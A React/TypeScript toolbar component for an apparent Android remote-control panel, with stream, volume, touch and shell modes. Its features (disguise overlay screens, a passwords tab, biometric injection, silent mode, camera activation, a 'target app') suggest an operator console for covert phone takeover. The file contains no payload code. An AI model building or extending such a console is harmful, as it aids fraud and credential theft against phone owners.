import React, { useEffect, useRef, useState } from "react";
import {
  Bell,
  Camera,
  Check,
  ChevronDown,
  ChevronLeft,
  Copy,
  Eye,
  Fingerprint,
  Layers,
  Lock,
  Maximize2,
  Pin,
  Power,
  Radio,
  RotateCw,
  Smartphone,
  Sparkles,
  Volume2,
  VolumeX,
  Wifi,
  X,
  Zap
} from "lucide-react";
import type { ControlDevice, InstalledAppItem } from "../../types";
import type { DeviceDisguiseConfig } from "@droidview/shared";
import { AppLogo } from "../../AppLogo";
import { QUALITY_PROFILES, type StreamQualityTier } from "./types";

export interface ScreenViewToolbarProps {
  device: ControlDevice;
  handleMacroAction: (cmd: string, label: string) => void;
  deviceVolume: number;
  isMuted: boolean;
  handleVolumeStep: (step: "up" | "down" | "mute") => void;
  handleVolumeChange: (val: number) => void;
  activeApp?: InstalledAppItem | null;
  onCloseApp?: () => void;
  silentActive: boolean;
  setSilentActive: (v: boolean) => void;
  srActive: boolean;
  setSrActive: (v: boolean) => void;
  hidActive: boolean;
  setHidActive: (v: boolean) => void;
  joyActive: boolean;
  setJoyActive: (v: boolean) => void;
  tacticalSwitch: boolean;
  setTacticalSwitch: (v: boolean) => void;
  touchActive: boolean;
  setTouchActive: (v: boolean) => void;
  telaActive: boolean;
  setTelaActive: (v: boolean) => void;
  camActive: boolean;
  setCamActive: (v: boolean) => void;
  shellActive: boolean;
  setShellActive: (v: boolean) => void;
  isBiometricActive: boolean;
  handleBiometricAuth: () => void;
  activeDisguise?: DeviceDisguiseConfig | null;
  setSidebarInitialTab: (tab: "telas" | "senhas") => void;
  setShowRightSidebar: React.Dispatch<React.SetStateAction<boolean>>;
  showRightSidebar: boolean;
  adaptiveMode: "auto" | "manual";
  setAdaptiveMode: (m: "auto" | "manual") => void;
  streamQuality: StreamQualityTier;
  setStreamQuality: (q: StreamQualityTier) => void;
  activeQualityRef: React.MutableRefObject<StreamQualityTier>;
  setFps: (fps: number) => void;
  isAutoFit: boolean;
  setIsAutoFit: (v: boolean | ((p: boolean) => boolean)) => void;
  viewScale: number;
  setViewScale: React.Dispatch<React.SetStateAction<number>>;
  isLocked: boolean;
  handleToggleLock: () => void;
  isPinned: boolean;
  handleTogglePin: () => void;
  handleCopyInfo: () => void;
  setScreenTimestamp: (ts: number) => void;
  refreshA11y: () => void;
  handleToggleFullscreen: () => void;
  showToast: (msg: string, type?: "info" | "success" | "warn") => void;
}

export const ScreenViewToolbar: React.FC<ScreenViewToolbarProps> = ({
  device,
  handleMacroAction,
  deviceVolume,
  isMuted,
  handleVolumeStep,
  handleVolumeChange,
  activeApp,
  onCloseApp,
  silentActive,
  setSilentActive,
  srActive,
  setSrActive,
  hidActive,
  setHidActive,
  joyActive,
  setJoyActive,
  tacticalSwitch,
  setTacticalSwitch,
  touchActive,
  setTouchActive,
  telaActive,
  setTelaActive,
  camActive,
  setCamActive,
  shellActive,
  setShellActive,
  isBiometricActive,
  handleBiometricAuth,
  activeDisguise,
  setSidebarInitialTab,
  setShowRightSidebar,
  showRightSidebar,
  adaptiveMode,
  setAdaptiveMode,
  streamQuality,
  setStreamQuality,
  activeQualityRef,
  setFps,
  isAutoFit,
  setIsAutoFit,
  viewScale,
  setViewScale,
  isLocked,
  handleToggleLock,
  isPinned,
  handleTogglePin,
  handleCopyInfo,
  setScreenTimestamp,
  refreshA11y,
  handleToggleFullscreen,
  showToast
}) => {
  const isOnline = device.status === "online";
  const isCellular = device.networkType === "4g" || device.networkType === "5g" || device.networkType === "3g";
  const [openMenu, setOpenMenu] = useState<"modos" | "telas" | "res" | "size" | null>(null);
  const toolbarRef = useRef<HTMLElement | null>(null);

  useEffect(() => {
    if (!openMenu) return;
    const handleClickOutside = (e: MouseEvent) => {
      if (toolbarRef.current && !toolbarRef.current.contains(e.target as Node)) {
        setOpenMenu(null);
      }
    };
    document.addEventListener("mousedown", handleClickOutside);
    return () => document.removeEventListener("mousedown", handleClickOutside);
  }, [openMenu]);

  const activeScreensCount = (telaActive ? 1 : 0) + (srActive ? 1 : 0) + (camActive ? 1 : 0);
  const currentResLabel = QUALITY_PROFILES[streamQuality]?.shortLabel || "720p";

  return (
    <header ref={toolbarRef} className="tactical-top-controls-bar">
      <div className="tactical-single-toolbar-row">
        {/* Lado Esquerdo: Voltar, Status Único e Volume */}
        <div className="tactical-device-header-left" style={{ display: "flex", alignItems: "center", gap: "6px" }}>
          <button
            type="button"
            className="tactical-back-btn"
            title="Voltar / Desfocar"
            onClick={() => handleMacroAction("input keyevent 4", "Voltar")}
          >
            <ChevronLeft size={15} />
          </button>

          {/* Badge Único de Conexão e Rede (Sem repetição de Conexão OFF + Sem Conexão) */}
          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "5px",
              background: isOnline ? "rgba(34, 197, 94, 0.14)" : "rgba(239, 68, 68, 0.14)",
              border: isOnline ? "1px solid rgba(34, 197, 94, 0.4)" : "1px solid rgba(239, 68, 68, 0.38)",
              borderRadius: "12px",
              padding: "2px 8px",
              color: isOnline ? "#22c55e" : "#f87171",
              fontSize: "10.5px",
              fontWeight: 800,
              letterSpacing: "0.3px",
              whiteSpace: "nowrap"
            }}
            title={
              isOnline
                ? `Conectado (${isCellular ? "Dados Móveis 4G/LTE" : "Wi-Fi"})`
                : "Aparelho Offline (Aguardando reconexão)"
            }
          >
            <span
              style={{
                width: "6px",
                height: "6px",
                borderRadius: "50%",
                background: isOnline ? "#22c55e" : "#ef4444",
                boxShadow: isOnline ? "0 0 6px #22c55e" : "0 0 5px #ef4444",
                animation: isOnline ? "pulse 1.8s infinite" : "none"
              }}
            />
            <span>{isOnline ? "Online" : "Offline"}</span>
            {isOnline && (
              <>
                <span style={{ opacity: 0.5 }}>·</span>
                {isCellular ? <Radio size={10} style={{ color: "#fbbf24" }} /> : <Wifi size={10} style={{ color: "#38bdf8" }} />}
                <span style={{ color: isCellular ? "#fbbf24" : "#38bdf8", fontFamily: "var(--font-mono)" }}>
                  {isCellular ? "4G" : "Wi-Fi"}
                </span>
              </>
            )}
          </div>

          {/* Volume Control: Linha Única Sleek */}
          <div
            className="tactical-volume-slider-row"
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "5px",
              padding: "2px 6px",
              background: "rgba(15, 23, 42, 0.6)",
              border: "1px solid rgba(56, 189, 248, 0.2)",
              borderRadius: "12px",
              flexShrink: 0
            }}
            title={`Volume do dispositivo: ${Math.round((deviceVolume / 15) * 100)}%`}
          >
            <button
              type="button"
              onClick={() => handleVolumeStep("mute")}
              title={isMuted ? "Desmutar Áudio" : "Mutar Áudio"}
              style={{
                background: "transparent",
                border: "none",
                color: isMuted ? "#ef4444" : "#38bdf8",
                cursor: "pointer",
                display: "flex",
                alignItems: "center",
                padding: "0"
              }}
            >
              {isMuted || deviceVolume === 0 ? <VolumeX size={13} /> : <Volume2 size={13} />}
            </button>
            <input
              type="range"
              min="0"
              max="15"
              step="1"
              value={isMuted ? 0 : deviceVolume}
              onChange={(e) => handleVolumeChange(Number(e.target.value))}
              className="tactical-volume-slider-line"
              style={{
                width: "34px",
                height: "3px",
                minHeight: "3px",
                maxHeight: "3px",
                padding: 0,
                border: "none",
                boxSizing: "border-box",
                borderRadius: "2px",
                outline: "none",
                WebkitAppearance: "none",
                appearance: "none",
                cursor: "pointer",
                background: `linear-gradient(to right, ${
                  isMuted ? "#ef4444" : "#38bdf8"
                } 0%, ${
                  isMuted ? "#ef4444" : "#38bdf8"
                } ${isMuted ? 0 : Math.round((deviceVolume / 15) * 100)}%, #1e293b ${
                  isMuted ? 0 : Math.round((deviceVolume / 15) * 100)}%, #1e293b 100%)`,
                margin: "0 2px"
              }}
              title={`Ajuste contínuo: ${Math.round((deviceVolume / 15) * 100)}%`}
            />
            <span
              style={{
                fontSize: "10px",
                fontWeight: 700,
                fontFamily: "var(--font-mono)",
                color: isMuted ? "#ef4444" : "#94a3b8",
                minWidth: "26px",
                textAlign: "right"
              }}
            >
              {isMuted ? "0%" : `${Math.round((deviceVolume / 15) * 100)}%`}
            </span>
          </div>

          {activeApp && (
            <span
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "5px",
                background: "rgba(56, 189, 248, 0.15)",
                border: "1px solid #38bdf8",
                borderRadius: "10px",
                padding: "1px 7px",
                color: "#38bdf8",
                fontWeight: 700,
                fontSize: "11px"
              }}
            >
              <AppLogo name={activeApp.name} packageName={activeApp.packageName} size={14} />
              <span>{activeApp.name}</span>
              {onCloseApp && (
                <button
                  type="button"
                  onClick={onCloseApp}
                  style={{
                    background: "transparent",
                    border: "none",
                    color: "#94a3b8",
                    cursor: "pointer",
                    padding: "0 2px",
                    fontSize: "10px"
                  }}
                  title="Desfocar app alvo"
                >
                  <X size={11} />
                </button>
              )}
            </span>
          )}
        </div>

        {/* Centro: Toggles Táteis & Submenus Unificados (1 Linha Limpa) */}
        <div className="tactical-pill-toggles-row">
          <button
            type="button"
            className={`tactical-pill-toggle ${isBiometricActive ? "active" : ""}`}
            onClick={handleBiometricAuth}
            style={{
              borderColor: isBiometricActive ? "#a855f7" : "#1e293b",
              background: isBiometricActive ? "rgba(168, 85, 247, 0.25)" : "transparent",
              color: isBiometricActive ? "#c084fc" : "#cbd5e1"
            }}
            title="Injetar / Autenticar Biometria cadastrada no dispositivo"
          >
            <Fingerprint size={11} className={isBiometricActive ? "animate-spin" : ""} style={{ color: "#a855f7" }} />
            <span className="pill-label">Biometria</span>
          </button>

          {/* SUBMENU 0: MODOS DE CONTROLE (Touch, Shell, Silent, HID, Joy, Preciso/Direto) */}
          <div className="tactical-dropdown-wrapper">
            <button
              type="button"
              className={`tactical-dropdown-trigger ${openMenu === "modos" ? "active" : ""}`}
              onClick={() => setOpenMenu(openMenu === "modos" ? null : "modos")}
              title="Modos de Controle (Touch, Shell, Silent, HID, Joystick, Preciso/Direto)"
            >
              <span>Modos</span>
              <ChevronDown size={11} style={{ opacity: 0.75 }} />
            </button>

            {openMenu === "modos" && (
              <div className="tactical-dropdown-menu">
                <div className="tactical-dropdown-header">MODOS DE INTERAÇÃO</div>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${touchActive ? "selected" : ""}`}
                  onClick={() => {
                    setTouchActive(!touchActive);
                    showToast(touchActive ? "Toque na tela desabilitado" : "Toque na tela habilitado", "success");
                  }}
                >
                  <span style={{ flex: 1 }}>Touch (Injeção de Toque)</span>
                  <span className={`tactical-dropdown-badge ${touchActive ? "on" : "off"}`}>
                    {touchActive ? "ON" : "OFF"}
                  </span>
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${shellActive ? "selected" : ""}`}
                  onClick={() => {
                    setShellActive(!shellActive);
                    showToast(shellActive ? "Barra de atalhos oculta" : "Barra de atalhos exibida", "info");
                  }}
                >
                  <span style={{ flex: 1 }}>Shell (Terminal Rodapé)</span>
                  <span className={`tactical-dropdown-badge ${shellActive ? "on" : "off"}`}>
                    {shellActive ? "ON" : "OFF"}
                  </span>
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${silentActive ? "selected" : ""}`}
                  onClick={() => {
                    setSilentActive(!silentActive);
                    showToast(silentActive ? "Modo silencioso desativado" : "Modo silencioso ativado", "success");
                  }}
                >
                  <span style={{ flex: 1 }}>Silent (Áudio Silencioso)</span>
                  <span className={`tactical-dropdown-badge ${silentActive ? "on" : "off"}`}>
                    {silentActive ? "ON" : "OFF"}
                  </span>
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${tacticalSwitch ? "selected" : ""}`}
                  onClick={() => {
                    setTacticalSwitch(!tacticalSwitch);
                    showToast(tacticalSwitch ? "Modo Touch Direto ativado" : "Modo Preciso ativado", "success");
                  }}
                >
                  <span style={{ flex: 1 }}>Toque: {tacticalSwitch ? "Preciso" : "Direto"}</span>
                  <span className="tactical-dropdown-badge on">
                    {tacticalSwitch ? "PRECISO" : "DIRETO"}
                  </span>
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${hidActive ? "selected" : ""}`}
                  onClick={() => {
                    setHidActive(!hidActive);
                    showToast(hidActive ? "HID desativado" : "HID ativado", "success");
                  }}
                >
                  <span style={{ flex: 1 }}>HID (Entrada Hardware)</span>
                  <span className={`tactical-dropdown-badge ${hidActive ? "on" : "off"}`}>
                    {hidActive ? "ON" : "OFF"}
                  </span>
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${joyActive ? "selected" : ""}`}
                  onClick={() => {
                    setJoyActive(!joyActive);
                    showToast(joyActive ? "Joystick desativado" : "Joystick ativado", "success");
                  }}
                >
                  <span style={{ flex: 1 }}>Joy (Navegação Direcional)</span>
                  <span className={`tactical-dropdown-badge ${joyActive ? "on" : "off"}`}>
                    {joyActive ? "ON" : "OFF"}
                  </span>
                </button>
              </div>
            )}
          </div>

          {/* SUBMENU 1: TELAS 1 / 2 (Tela 1 Ao Vivo, Tela 2 Esqueleto A11Y, Câmera, Disfarces e Push) */}
          <div className="tactical-dropdown-wrapper">
            <button
              type="button"
              className={`tactical-dropdown-trigger ${openMenu === "telas" || activeDisguise?.active ? "active" : ""}`}
              onClick={() => setOpenMenu(openMenu === "telas" ? null : "telas")}
              title="Submenu de Telas (1 Tela, 2 Telas, Esqueleto A11Y, Câmera e Disfarces)"
            >
              <Layers size={11} style={{ color: activeDisguise?.active ? "#ff4d5a" : "#38bdf8" }} />
              <span>Telas ({activeScreensCount})</span>
              <ChevronDown size={11} style={{ opacity: 0.75 }} />
            </button>

            {openMenu === "telas" && (
              <div className="tactical-dropdown-menu">
                <div className="tactical-dropdown-header">MODO DE VISUALIZAÇÃO</div>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${telaActive && !srActive && !camActive ? "selected" : ""}`}
                  onClick={() => {
                    setTelaActive(true);
                    setSrActive(false);
                    setCamActive(false);
                    setOpenMenu(null);
                    showToast("Modo 1 Tela: Apenas Tela Ao Vivo ativa", "success");
                  }}
                >
                  <Smartphone size={12} style={{ color: "#38bdf8" }} />
                  <span style={{ flex: 1 }}>1 Tela — Foco Ao Vivo</span>
                  {telaActive && !srActive && !camActive && <Check size={12} style={{ color: "#38bdf8" }} />}
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${telaActive && srActive && !camActive ? "selected" : ""}`}
                  onClick={() => {
                    setTelaActive(true);
                    setSrActive(true);
                    setCamActive(false);
                    setOpenMenu(null);
                    showToast("Modo 2 Telas: Ao Vivo + Esqueleto 2D (A11Y)", "success");
                  }}
                >
                  <Layers size={12} style={{ color: "#22c55e" }} />
                  <span style={{ flex: 1 }}>2 Telas — Ao Vivo + A11Y</span>
                  {telaActive && srActive && !camActive && <Check size={12} style={{ color: "#22c55e" }} />}
                </button>

                <div className="tactical-dropdown-divider" />
                <div className="tactical-dropdown-header">PAINÉIS INDIVIDUAIS</div>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${telaActive ? "selected" : ""}`}
                  onClick={() => {
                    setTelaActive(!telaActive);
                    showToast(telaActive ? "Tela 1 (Ao Vivo) ocultada" : "Tela 1 (Ao Vivo) exibida", "success");
                  }}
                >
                  <Smartphone size={12} style={{ color: telaActive ? "#22c55e" : "#64748b" }} />
                  <span style={{ flex: 1 }}>Tela 1: Ao Vivo (Stream)</span>
                  <span className={`tactical-dropdown-badge ${telaActive ? "on" : "off"}`}>
                    {telaActive ? "ON" : "OFF"}
                  </span>
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${srActive ? "selected" : ""}`}
                  onClick={() => {
                    setSrActive(!srActive);
                    showToast(srActive ? "Tela 2 (A11Y) ocultada" : "Tela 2 (A11Y) exibida", "success");
                  }}
                >
                  <Eye size={12} style={{ color: srActive ? "#38bdf8" : "#64748b" }} />
                  <span style={{ flex: 1 }}>Tela 2: Esqueleto 2D (A11Y)</span>
                  <span className={`tactical-dropdown-badge ${srActive ? "on" : "off"}`}>
                    {srActive ? "ON" : "OFF"}
                  </span>
                </button>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${camActive ? "selected" : ""}`}
                  onClick={() => {
                    setCamActive(!camActive);
                    showToast(camActive ? "Câmera desativada" : "Câmera ativada", "info");
                  }}
                >
                  <Camera size={12} style={{ color: camActive ? "#f59e0b" : "#64748b" }} />
                  <span style={{ flex: 1 }}>Tela 3: Câmera Óptica</span>
                  <span className={`tactical-dropdown-badge ${camActive ? "on" : "off"}`}>
                    {camActive ? "ON" : "OFF"}
                  </span>
                </button>

                <div className="tactical-dropdown-divider" />
                <div className="tactical-dropdown-header">AÇÃO NO APARELHO</div>
                <button
                  type="button"
                  className="tactical-dropdown-item"
                  onClick={() => {
                    setSidebarInitialTab("telas");
                    setShowRightSidebar(true);
                    setOpenMenu(null);
                  }}
                >
                  <Smartphone size={12} style={{ color: "#c084fc" }} />
                  <span style={{ flex: 1 }}>Telas de Disfarce (Overlay)</span>
                </button>
                <button
                  type="button"
                  className="tactical-dropdown-item"
                  onClick={() => {
                    setSidebarInitialTab("telas");
                    setShowRightSidebar(true);
                    setOpenMenu(null);
                  }}
                >
                  <Bell size={12} style={{ color: "#fbbf24" }} />
                  <span style={{ flex: 1 }}>Enviar Push Notification</span>
                </button>
              </div>
            )}
          </div>

          {/* SUBMENU 2: RESOLUÇÃO (1 botão com seleção interna: AUTO, 1080p, 720p, 540p, 360p) */}
          <div className="tactical-dropdown-wrapper">
            <button
              type="button"
              className={`tactical-dropdown-trigger ${openMenu === "res" ? "active" : ""}`}
              onClick={() => setOpenMenu(openMenu === "res" ? null : "res")}
              title="Selecionar Resolução de Transmissão (Adaptativo ou Fixa)"
            >
              <Zap size={11} style={{ color: adaptiveMode === "auto" ? "#10b981" : QUALITY_PROFILES[streamQuality].color }} />
              <span>Res: {adaptiveMode === "auto" ? `AUTO (${currentResLabel})` : currentResLabel}</span>
              <ChevronDown size={11} style={{ opacity: 0.75 }} />
            </button>

            {openMenu === "res" && (
              <div className="tactical-dropdown-menu align-right">
                <div className="tactical-dropdown-header">RESOLUÇÃO DE TRANSMISSÃO</div>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${adaptiveMode === "auto" ? "selected" : ""}`}
                  onClick={() => {
                    setAdaptiveMode("auto");
                    setOpenMenu(null);
                    showToast("Modo Adaptativo (ABR) ativado: Resolução automática!", "success");
                  }}
                >
                  <Zap size={12} style={{ color: "#10b981" }} />
                  <span style={{ flex: 1 }}>AUTO — Adaptativo ({currentResLabel})</span>
                  {adaptiveMode === "auto" && <Check size={12} style={{ color: "#10b981" }} />}
                </button>

                <div className="tactical-dropdown-divider" />
                {(
                  [
                    { tier: "ultra", label: "1080p — Ultra HD", desc: "Nitidez Máx" },
                    { tier: "high", label: "720p — Alta Definição", desc: "HD Padrão" },
                    { tier: "balance", label: "540p — Equilibrada", desc: "qHD Rápida" },
                    { tier: "fluid", label: "360p — Fluida / Eco", desc: "Baixa Latência" }
                  ] as const
                ).map((item) => {
                  const isCur = adaptiveMode === "manual" && streamQuality === item.tier;
                  const itemProf = QUALITY_PROFILES[item.tier];
                  return (
                    <button
                      key={item.tier}
                      type="button"
                      className={`tactical-dropdown-item ${isCur ? "selected" : ""}`}
                      onClick={() => {
                        setAdaptiveMode("manual");
                        setStreamQuality(item.tier);
                        activeQualityRef.current = item.tier;
                        setFps(itemProf.targetFps);
                        setOpenMenu(null);
                        showToast(`Resolução fixada em ${itemProf.shortLabel}`, "info");
                      }}
                    >
                      <span
                        style={{
                          width: "7px",
                          height: "7px",
                          borderRadius: "50%",
                          background: itemProf.color,
                          flexShrink: 0
                        }}
                      />
                      <span style={{ flex: 1 }}>{item.label}</span>
                      <span style={{ fontSize: "9.5px", color: "#64748b", fontFamily: "var(--font-mono)" }}>
                        {item.desc}
                      </span>
                      {isCur && <Check size={12} style={{ color: itemProf.color }} />}
                    </button>
                  );
                })}
              </div>
            )}
          </div>

          {/* SUBMENU 3: TAMANHO DA TELA (1 botão com AUTO e níveis P, M, G, Max e +/- dentro do submenu) */}
          <div className="tactical-dropdown-wrapper">
            <button
              type="button"
              className={`tactical-dropdown-trigger ${openMenu === "size" ? "active" : ""}`}
              onClick={() => setOpenMenu(openMenu === "size" ? null : "size")}
              title="Ajustar Tamanho da Tela (AUTO Proporcional ou Escala Manual)"
            >
              <Sparkles size={11} style={{ color: isAutoFit ? "#38bdf8" : "#cbd5e1" }} />
              <span>Tamanho: {isAutoFit ? "AUTO" : `${viewScale}%`}</span>
              <ChevronDown size={11} style={{ opacity: 0.75 }} />
            </button>

            {openMenu === "size" && (
              <div className="tactical-dropdown-menu align-right">
                <div className="tactical-dropdown-header">TAMANHO DA TELA (VIEWPORT)</div>
                <button
                  type="button"
                  className={`tactical-dropdown-item ${isAutoFit ? "selected" : ""}`}
                  onClick={() => {
                    setIsAutoFit(true);
                    setViewScale(100);
                    setOpenMenu(null);
                    showToast("Tamanho AUTO ativado: Ajuste proporcional ao monitor!", "success");
                  }}
                >
                  <Sparkles size={12} style={{ color: "#38bdf8" }} />
                  <span style={{ flex: 1 }}>AUTO — Proporcional (9:16)</span>
                  {isAutoFit && <Check size={12} style={{ color: "#38bdf8" }} />}
                </button>

                <div className="tactical-dropdown-divider" />
                {(
                  [
                    { label: "P — Pequeno", scale: 70 },
                    { label: "M — Médio", scale: 85 },
                    { label: "G — Padrão", scale: 100 },
                    { label: "Max — Expandido", scale: 120 }
                  ] as const
                ).map((preset) => {
                  const isCur = !isAutoFit && Math.abs(viewScale - preset.scale) <= 5;
                  return (
                    <button
                      key={preset.label}
                      type="button"
                      className={`tactical-dropdown-item ${isCur ? "selected" : ""}`}
                      onClick={() => {
                        setIsAutoFit(false);
                        setViewScale(preset.scale);
                        setOpenMenu(null);
                        showToast(`Tamanho da tela ajustado para ${preset.scale}%`, "info");
                      }}
                    >
                      <span style={{ flex: 1 }}>{preset.label}</span>
                      <span style={{ fontSize: "10px", color: "#94a3b8", fontFamily: "var(--font-mono)" }}>
                        {preset.scale}%
                      </span>
                      {isCur && <Check size={12} style={{ color: "#38bdf8" }} />}
                    </button>
                  );
                })}

                <div className="tactical-dropdown-divider" />
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "4px 6px",
                    gap: "6px"
                  }}
                >
                  <button
                    type="button"
                    className="tactical-dropdown-step-btn"
                    onClick={() => {
                      setIsAutoFit(false);
                      setViewScale((prev) => Math.max(50, prev - 10));
                    }}
                    title="Diminuir 10%"
                  >
                    - 10%
                  </button>
                  <span style={{ fontSize: "10.5px", fontWeight: 800, fontFamily: "var(--font-mono)", color: "#e2e8f0" }}>
                    {isAutoFit ? "AUTO" : `${viewScale}%`}
                  </span>
                  <button
                    type="button"
                    className="tactical-dropdown-step-btn"
                    onClick={() => {
                      setIsAutoFit(false);
                      setViewScale((prev) => Math.min(150, prev + 10));
                    }}
                    title="Aumentar 10%"
                  >
                    + 10%
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Ações Rápidas no Canto Direito */}
        <div className="tactical-actions-group">
          <button
            type="button"
            className={`quick-actions-toggle-pill ${showRightSidebar ? "active" : ""}`}
            title="Abrir / Fechar Painel de Funções Rápidas"
            onClick={() => setShowRightSidebar(!showRightSidebar)}
          >
            <Zap size={12} style={{ fill: showRightSidebar ? "#ff1a2a" : "none" }} />
            <span>AÇÕES</span>
          </button>

          <button
            type="button"
            className={`tactical-action-btn ${isLocked ? "active" : ""}`}
            title="Bloquear / Desbloquear Tela do Aparelho (Power)"
            onClick={handleToggleLock}
            style={{ color: isLocked ? "#ef4444" : "#f59e0b" }}
          >
            {isLocked ? <Lock size={13} /> : <Power size={13} />}
          </button>

          <button
            type="button"
            className={`tactical-action-btn ${isPinned ? "active" : ""}`}
            title="Fixar painel de visualização"
            onClick={handleTogglePin}
          >
            <Pin size={13} />
          </button>

          <button
            type="button"
            className="tactical-action-btn"
            title="Copiar dados do dispositivo"
            onClick={handleCopyInfo}
          >
            <Copy size={13} />
          </button>

          <button
            type="button"
            className="tactical-action-btn"
            title="Atualizar Tela Manualmente"
            onClick={() => {
              setScreenTimestamp(Date.now());
              refreshA11y();
              showToast("Tela e acessibilidade sincronizadas", "success");
            }}
          >
            <RotateCw size={13} />
          </button>

          <button
            type="button"
            className="tactical-action-btn"
            title="Tela Cheia (Fullscreen)"
            onClick={handleToggleFullscreen}
          >
            <Maximize2 size={13} />
          </button>
        </div>
      </div>
    </header>
  );
};
